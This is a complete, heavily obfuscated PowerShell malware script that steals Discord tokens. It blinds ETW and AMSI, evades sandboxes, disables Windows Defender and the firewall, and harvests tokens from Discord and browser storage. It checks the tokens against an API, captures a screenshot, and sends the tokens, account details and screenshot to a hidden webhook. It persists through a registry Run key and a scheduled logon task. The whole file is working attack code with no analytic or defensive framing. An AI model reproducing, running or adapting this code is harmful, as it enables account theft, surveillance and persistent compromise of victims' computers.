# ═══ In-Memory Patches (Polymorphic) ═══
# ETW blind (P/Invoke)
[void]([Math]::Abs(87744))
$KQLCc = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$M01bqo = Add-Type -MemberDefinition $KQLCc -Name 'InitValue99' -Namespace 'HandleValue13' -PassThru
$zkCdnT = "MFYPU"
$OLOgX8 = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
$D3r8 = (-join([byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6e,0x74,0x57,0x72,0x69,0x74,0x65)|%{[char]$_}))
$r7s4b4I = $M01bqo::LoadLibrary($OLOgX8)
$xPMG = $M01bqo::GetProcAddress($r7s4b4I, $D3r8)
[void]([Math]::Abs(22260))
$Slj8 = 0
$M01bqo::VirtualProtect($xPMG, [UIntPtr]::new(1), 0x40, [ref]$Slj8) | Out-Null
$l8sftkh = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($l8sftkh, 0, $xPMG, $l8sftkh.Length)
$M01bqo::VirtualProtect($xPMG, [UIntPtr]::new(1), $Slj8, [ref]$Slj8) | Out-Null
$YXn7j7Ez = [int](9485) % 256

# Runtime memory patch
Start-Sleep -Milliseconds 0
$Cgqqvdov = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
$gugvWB = [int](4751) % 256
$k1b1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ="))
$qZ8H = [Ref].Assembly.GetType($Cgqqvdov)
Start-Sleep -Milliseconds 47
$JJSkPzA7 = $qZ8H.GetField($k1b1, (-join([byte[]](0x4e,0x6f,0x6e,0x50,0x75,0x62,0x6c,0x69,0x63,0x2c,0x53,0x74,0x61,0x74,0x69,0x63)|%{[char]$_})))
$JJSkPzA7.SetValue($null, $true)
Start-Sleep -Milliseconds 3

# Environment validation
$PdVCBqJW = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($PdVCBqJW -lt 2) { exit }
$QR1UMqyb = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($QR1UMqyb -lt 2GB) { exit }
$k40rcqG = [System.DateTime]::Now
Start-Sleep -Milliseconds 1276
if (([System.DateTime]::Now - $k40rcqG).TotalMilliseconds -lt 1020) { exit }

function CheckState54($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        (CheckState54 @(201,109,3,135) @(168,58,85,179,139,48,250)),
        (CheckState54 @(9,32,129,90,245,59,84,228,111,252,50,9,237,5,192,127) @(66,101,180,54,145)),
        (CheckState54 @(166,85,129,12,198,199,197,210,171,83,153,79,235,252,247,203,150,123,188,1) @(242,56,215,60,138,171,161,190)),
        (CheckState54 @(142,245,158,50,42,165,32,63,133,229,245,85,44,128,18,57,190,223,196,60) @(220,178,167,1,72,200,88,73)),
        (CheckState54 @(99,152,158,241,76,147,168,233,75,161,149,232,100,232,176,246,76,162,207,240,73,131,168,241,76,140,176,175,75,233,172,231,113,233,195,235,76,156,172,235,76,152,207,244,74,233,202,232,75,233,188,236,75,233,146,246,74,143,191,231,101,161,191,233,102,162,203,233,73,131,146,242,74,152,195,228,74,233,206,232,74,140,188,238,74,178,195,228,74,233,206,235,75,147,183,230,98,162,145,163) @(40,219,250,158))
    )
    return ($s -join '') + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICM="))) + $r
}

# === AMSI BYPASS ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$hook = (CheckState54 @(214,186,255,93,212,186,224,91,251,139,148,6,214,170,227,7,213,193,231,6,251,159,227,27,213,161,148,5,212,181,198,27,211,192,251,4,214,181,148,27,214,193,224,27,250,166,248,23,248,182,228,21,249,182,244,88,250,152,248,88,249,152,244,20,250,166,224,23,250,155,148,31,229,164,236,20,224,180,251,62,214,166,231,31,213,182,251,30,249,156,251,39,226,159,201,0,239,194,197,43,227,170,201,57,224,158,251,20,213,186,251,28,214,136,251,33,228,181,198,23,225,186,197,7,229,192,227,0,229,152,239,2,210,170,228,92,212,159,231,59,212,180,231,39,251,170,248,25,248,166,255,32,213,136,247,5,227,167,193,2,229,179,144,80) @(183,242,173,109))
$api = (CheckState54 @(38,59,94,153,92,15,62,58,229,70,126,24,109,241,113,45,17,63,227,84,11,30,66,223,93,20,74,100,202,120,44,5,104,195,84,49,23,84,231,83,36,29,65,223,110,0,66,96) @(71,115,12,169,63))

# === IMPROVED REGEX PATTERNS ===
$patterns = @(
    '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}',           # Standard token
    'mfa\.[\w-]{84}',                              # MFA token
    '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}[\w-]*',     # Extended token
    '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}[\w-]{0,10}' # Token with extra chars
)

$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq (CheckState54 @(206,61,215,122,226,204,7,211,78,246,163,2,213,75,225,192,9,192,83,233,207,96,212,91,231,203,108,187) @(154,81,134,29,179)))
$firstRun = $true

# === DISABLE DEFENDER ===
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { netsh advfirewall set allprofiles state off > $null 2>&1 } catch {}

# === IMPROVED TOKEN EXTRACTION ===
function Extract-Tokens {
    param([string]$content)
    $tokens = @()
    foreach ($pattern in $patterns) {
        $matches = [regex]::Matches($content, $pattern)
        foreach ($m in $matches) {
            $tokens += $m.Value
        }
    }
    return $tokens | Select-Object -Unique
}

function Read-FileContent {
    param([string]$path)
    try {
        # Try UTF-8 first
        $content = Get-Content $path -Raw -ErrorAction SilentlyContinue
        if ($content) { return $content }
        
        # Try reading as bytes and convert
        $bytes = [System.IO.File]::ReadAllBytes($path)
        $content = [System.Text.Encoding]::UTF8.GetString($bytes)
        if ($content) { return $content }
        
        # Try ISO-8859-1
        $iso = [System.Text.Encoding]::GetEncoding((CheckState54 @(149,82,210,165,138,80,251,193,136,80,247,129,139,85,161,200) @(198,4,156,245)))
        $content = $iso.GetString($bytes)
        return $content
    } catch {
        return $null
    }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @((CheckState54 @(154,167,249,139,232,117,201,30,154,161,168,204) @(192,224,149,241,177,71,240,103)), (CheckState54 @(119,198,170,203,62,31,184,191,235,32,99,233,164,220,33,84,228,151,140,90) @(45,129,198,177,103)), (CheckState54 @(25,239,47,83,154,64,122,209,25,97,129,66,26,207,126,20) @(67,168,67,41,195,114)), (CheckState54 @(76,106,218,48,79,31,143,51,76,106,228,38,114,64,224,57,116,30,244,62,76,122,131,122) @(22,45,182,74)))
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA ($d + (CheckState54 @(53,151,22,98,24,149,43,161,39,82,15,151,15,225,36,124,27,149,59,177,12,83,23,149,55,133,22,127,24,192,80,239) @(109,210,110,20,65,167)))
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = ($env + (CheckState54 @(96,172,247,111,179,31,129,194,110,180,109,150,221,122,164,122,150,217,71,170,77,245,182,81,128,104,145,236,110,208,71,190,237,13,211,67,159,201,105,152,117,159,198,88,176,104,129,191,102,179,18,250) @(47,199,143,63,226))); Default = (CheckState54 @(217,112,215,251,118,119,221,68,229,215,18,18) @(139,55,129,150,47,47)) },
        @{ Path = ($env + (CheckState54 @(45,12,3,60,136,93,151,240,51,49,57,61,139,40,151,232,51,49,3,34,184,58,159,196,0,84,53,26,131,3,131,222,48,48,41,2,131,59,169,235,1,85,45,21,144,40,131,213,6,32,62,81) @(98,103,123,108,217,109,209,189))); Default = (CheckState54 @(40,117,109,162,251,93,44,65,95,142,159,56) @(122,50,59,207,162,5)) },
        @{ Path = ($env + (CheckState54 @(239,222,139,230,75,198,198,237,228,165,244,75,164,197,230,224,162,224,98,181,227,205,243,193,236,76,184,246,250,219,161,133,67,174,202,204,237,182,252,99,175,216,250,217,191,227,80,143,226,147,209,137,236,66,188,227,246,237,189,218,121,159,194,229,236,171,228,114) @(160,181,243,182,26,246,128))); Default = (CheckState54 @(130,232,82,60,204,100,134,220,96,16,168,1) @(208,175,4,81,149,60)) },
        @{ Path = ($env + (CheckState54 @(249,190,49,210,7,134,147,4,211,0,244,132,27,199,16,227,132,31,250,1,215,141,19,234,52,241,135,57,218,16,224,175,19,218,31,209,135,14,196,102,239,132,116,191) @(182,213,73,130,86))); Default = (CheckState54 @(13,47,6,24,52,78,153,28,59,41,109,72) @(95,104,80,117,109,22,207,111)) }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq (CheckState54 @(58,119,179,39,49,97,62,67,129,11,85,4) @(104,48,229,74,104,57)) -or $_.Name -like (CheckState54 @(142,10,127,50,184,230,215,246,129,17,116,53) @(219,66,53,68,226,139,187,133))
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName (CheckState54 @(43,147,252,123,234,40,163,162,68,128,45,162,166,124,245,17,142,147,105,192,37,140,159,125,209,56,134,172) @(127,212,197,17,179))
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    # Scan each path
    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $content = Read-FileContent -path $fl.FullName
            if ($content) {
                $tokens = Extract-Tokens -content $content
                foreach ($token in $tokens) {
                    $null = $found.Add($token)
                }
            }
        }
    }

    # Also scan the actual Discord/Local Storage folder
    $storagePaths = @(
        ($env + (CheckState54 @(160,76,50,48,235,189,2,173,113,49,39,221,170,23,131,93,45,83,135,129,10,169,95,57,3,140,182,56,141,100,54,53,218,191,105,150,126,35,5,210,160,23,151,75,16,12,232,139,10,168,110,73) @(239,39,116,97,190,248,80))),
        ($env + (CheckState54 @(0,67,142,206,176,10,122,138,201,160,9,75,154,216,137,53,113,250,166,156,21,109,134,247,135,34,110,177,250,179,55,101,170,173,171,39,74,139,221,177,43,111,241,230,188,24,76,164,199,162,55,68,172,242,179,60,114,143,214,216) @(79,40,200,159,229))),
        ($env + (CheckState54 @(255,114,36,104,252,177,91,242,79,39,127,202,166,78,220,99,59,11,144,141,83,246,91,55,104,197,140,68,210,43,44,81,203,183,75,228,125,37,0,208,173,94,212,117,58,126,209,152,109,221,79,17,99,238,189,52) @(176,25,98,57,169,244,9))),
        ($env + (CheckState54 @(19,218,108,188,112,162,199,68,10,244,108,142,113,160,249,104,61,249,120,135,71,212,223,109,4,244,82,155,124,213,211,117,21,247,100,221,71,212,223,110,6,131,124,142,71,160,195,52,6,230,82,134,124,128,168,59) @(92,177,42,237,37,231,149,6)))
    )
    foreach ($p in $storagePaths) {
        if (Test-Path $p) {
            $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue
            foreach ($fl in $files) {
                $content = Read-FileContent -path $fl.FullName
                if ($content) {
                    $tokens = Extract-Tokens -content $content
                    foreach ($token in $tokens) {
                        $null = $found.Add($token)
                    }
                }
            }
        }
    }
}

# === TOKEN VALIDATION ===
function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { 
        # Try alternative validation
        if ($token -match '^[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}$') {
            return $true
        }
        return $false 
    }
}

$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                (CheckState54 @(122,82,114,123,79,99,13,85,118,56,106,98,72,75,1,42) @(44,10,60,23))  = (CheckState54 @(255,43,29,5,207,208,6,194,242,47,28,2,226,237,63,214,224,58,64,67,204,234,44,199,207,79,105,84,250,235,47,214,230,40,101,70,227,195,13,214,253,78,72,70,224,237,47,134,226,52,67,1,224,196,21,214,250,36,102,68,204,192,40,233,241,43,110,127,207,223,47,199,229,40,105,0,226,237,51,131,226,63,76,127,253,193,44,255,255,63,83,84,204,192,18,195,241,47,102,123,244,208,48,195,201,5,79,84,255,181,22,200,201,78,21,95,226,253,59,200,230,63,16,68,226,237,63,196,230,63,102,103,247,208,36,217,200,17,79,69,224,211,51,130,231,22,105,1) @(171,124,36,51,174,135,126,177))
                (CheckState54 @(224,244,198,199,96,126,101,136) @(177,163,136,173,58,38,39,184))      = (CheckState54 @(120,108,153,118,15,102,88,177,88,53,115,68,185,51,89,87,85,181,79,27,67,83,230,60) @(33,52,219,1,109))
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 5 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    username = $r.username
                    id       = $r.id
                    email    = if ($r.email) { $r.email } else { (CheckState54 @(89,198,126,6) @(13,175,71,68,233,3)) }
                    phone    = if ($r.phone) { $r.phone } else { (CheckState54 @(226,113,165,233) @(182,24,156,171,59,226,213,249)) }
                    nitro    = switch ($r.premium_type) { 1 { (CheckState54 @(127,53,66,176,149,117,89,245,119,112,7,229) @(46,7,58,216,246,70,23,133)) } 2 { (CheckState54 @(51,124,102,77,213,10,41,55) @(103,17,10,125,182)) } default { (CheckState54 @(8,87,18,144,6,107,22,216) @(92,58,43,229)) } }
                    mfa      = if ($r.mfa_enabled) { (CheckState54 @(122,16,91,186) @(45,71,13,192,179,43,151)) } else { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8="))) }
                    token    = $token
                })
            }
        } catch { 
            # If API fails, still include the token as valid
            $validTokens.Add([PSCustomObject]@{
                username = (CheckState54 @(63,138,206,94,13,85,99,90,191,156,17,82) @(105,221,251,44,111,56,90))
                id       = (CheckState54 @(136,238,138,174) @(220,135,179,236,142,167,226,122))
                email    = (CheckState54 @(214,37,37,14) @(130,76,28,76,207,7,188))
                phone    = (CheckState54 @(162,36,145,81) @(246,77,168,19,143,14))
                nitro    = (CheckState54 @(212,20,42,184,226,141,187,112,125,173,189,221) @(130,67,31,202,128,224))
                mfa      = (CheckState54 @(90,38,239,131,110,28,227,194,110,22,231,204) @(12,113,218,241))
                token    = $token
            })
        }
    }
}

# === SCREENSHOT ===
$bytes = $null
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    $bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    [Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
    $ms = New-Object IO.MemoryStream
    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
    $bytes = $ms.ToArray()
    $ms.Close()
    $bmp.Dispose()
} catch { $bytes = $null }

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $pcName = [System.Environment]::GetEnvironmentVariable((CheckState54 @(7,6,20,79,178,243,223,3,100,123,75,168,228,220,103,112) @(86,54,45,1,231,181,137)))
    $userName = [System.Environment]::GetEnvironmentVariable((CheckState54 @(59,216,133,106,56,229,254,110,57,219,158,17) @(109,142,203,44)))
    $report = ((CheckState54 @(193,25,105,112,35,61,220,61,79,84,35,2,216,35,91,90,32,58,204,51,72,121,35,2,210,35,118,99,54,61,200,52,86,123,52,108) @(138,112,25,18,117,81)) + $pcName + (CheckState54 @(89,71,56,170,135,48,83,29,39,145,224,85) @(26,43,110,208,221,104)) + $userName + (CheckState54 @(95,194,139,19,200,91,194,186,50,236,78,216,176,73,252,105,205,171,20,205) @(28,174,209,123,170)) + $($validTokens.Count) + (CheckState54 @(107,77,92,68) @(40,42,51,121,44,54,45)))
    
    if ($validTokens.Count -eq 0) {
        $report += (CheckState54 @(113,128,65,251,65,170,64,238,127,186,76,230,108,170,35,234,65,186,76,247,105,132,59,217,68,181,55,246,71,222,51,247,108,170,64,229,108,170,51,229,71,222,29,230,127,181,48,251,127,170,63,172,124,190,59,232,68,181,55,230,68,186,76,242,105,138,68,161) @(37,237,121,156))
    }
    
    foreach ($ti in $validTokens) {
        $report += (([char]0x2a+[char]0x2a) + $($ti.username) + (CheckState54 @(119,171,83,162,225,217,11,254,102,149,8,223,254,217,115,177) @(60,194,60,233,183,158,50,140)) + $($ti.token) + (CheckState54 @(88,201,156,241,31,61,207,102) @(1,136,236,187,77,121,160)) + $($ti.id) + (CheckState54 @(121,135,56,201,93,120,86,159,33,212,69,18) @(58,236,110,189,4,47)) + $($ti.email) + (CheckState54 @(44,117,95,165,125,45,228,170,32,112,92,247) @(111,25,29,202,31,31,209,198)) + $($ti.phone) + (CheckState54 @(26,159,59,27,61,188,68,29,22,157,79,86) @(89,244,14,107)) + $($ti.nitro) + (CheckState54 @(253,35,110,194,149,28,196,204,251,2,88,152) @(180,107,25,165,193,73,158,142)) + $($ti.mfa) + (CheckState54 @(94,118,187,38) @(29,17,212,27,212,171,168)))
    }

    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content = $report} -ErrorAction SilentlyContinue
    } catch {}

    if ($bytes) {
        try {
            $boundary = (CheckState54 @(140,147,203,107,104,227,154,241,153,87,118,132,163,173,173,92,70,134,150,181,161,88,98,204,165,145,198,34) @(192,192,251,31,36,181)) + (Get-Random).ToString()
            $LF = (CheckState54 @(166,5,77,231) @(226,84,34,218,85,241))
            $body = (
                (([char]0x2d+[char]0x2d) + $boundary + $LF) +
                ((CheckState54 @(70,151,49,179,225,129,183,98,193,75,247,192,167,185,89,210,106,245,203,182,133,80,201,126,164,239,169,134,77,200,49,191,231,149,208,124,252,80,148,237,137,152,85,208,81,145,180,170,177,64,228,97,156,232,170,146,77,242,73,175,202,191,163,122,196,95,190,233,164,140,81,209,82,146,180,161,168,121,235,98,165,232,144,141,117,203,70,169,231,245,176,98,198,79,243,235,159,162,94,152) @(23,165,8,198,133,198,225)) + $LF) +
                ((CheckState54 @(90,236,78,202,65,94,146,184,111,157,70,234,64,65,134,161,68,183,53,207,71,78,130,163,81,141,78,200,71,116,167,240) @(11,222,119,191,37,25,196,205)) + $LF + $LF)
            )
            $footer = ($LF + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $LF)
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = (CheckState54 @(156,26,179,109,207,187,136,75) @(201,95,138,57,153,250,181,118))
            $webRequest.ContentType = ((CheckState54 @(206,194,115,222,120,241,192,237,124,245,86,134,224,168,127,219,127,219,156,238,127,234,90,134,245,206,86,202,69,219,149,171,71,192,78,222,207,244,78,148) @(172,154,37,173,28,182)) + $boundary)
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = (CheckState54 @(213,112,186,57,202,153,252,77,226,77,198,178,212,116,182,102,245,134,227,80,207,93,165,183,212,112,186,100,242,184,247,67,217,82,209,166,239,89,239,125,201,153,248,77,202,73,161,242,255,112,235,122,202,134,228,91,225,99,209,181,239,78,193,109,217,172,218,91,230,73,248,177,213,90,179,109,218,243,222,7,231,66,210,187,249,94,187,124,243,172,240,4,207,103,244,177,210,112,235,59,201,175,224,77,217,82,218,171,212,5,182,58,202,150,131,7,207,103,222,183,212,100,186,112,201,150,194,77,226,77,214,181,251,99,202,112,221,149,247,4,207,82,210,177,211,112,213,121,220,242,248,65,225,99,169,181,239,96,239,127,220,242,248,65,225,99,165,182,213,77,198,100,219,150,247,94) @(182,55,131,10,144,193))
try { Set-ItemProperty -Path (CheckState54 @(17,75,101,7,149,252,78,134,23,60,40,46,167,224,90,141,33,99,71,32,151,255,82,143,33,99,40,57,161,154,100,213,26,72,117,51,161,197,108,147,38,61,95,32,146,155,104,156,33,99,71,54,167,238,100,137,33,96,95,51,161,154,11,134,23,96,71,54) @(66,14,17,67,195,168,62,229)) -Name (CheckState54 @(193,158,215,114,141,19,174,159,216,54,153,56,206,159,237,126,182,12,197,153,232,64,129,60,245,228,233,104) @(151,172,187,7,215,84)) -Value $cmd -ErrorAction SilentlyContinue } catch {}
try { schtasks /create /tn (CheckState54 @(206,56,37,28,198,223,51,122,10,173,214,102,16,90,202,225,107,17,59,169,203,77,31,1,254,208,88,38) @(152,10,73,105,156)) /tr ($cmd) /sc onlogon /f /rl highest /it > $null 2>&1 } catch {}

# === INSTANT EXIT ===
exit
